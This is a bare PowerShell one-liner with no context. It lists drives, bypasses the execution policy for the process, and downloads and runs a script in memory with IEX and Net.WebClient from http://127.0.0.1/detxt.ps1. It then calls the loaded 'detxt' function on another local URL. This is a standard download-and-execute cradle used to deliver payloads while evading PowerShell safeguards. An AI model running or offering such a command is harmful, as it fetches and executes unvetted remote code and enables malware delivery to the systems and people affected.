
dir c:\;sleep(5);Set-ExecutionPolicy Bypass -Scope Process;sleep(5);dir d:\;IEX ((New-Object Net.WebClient).DownloadString('http://127.0.0.1/detxt.ps1') );dir c:\;detxt http://127.0.0.1/1.txt;

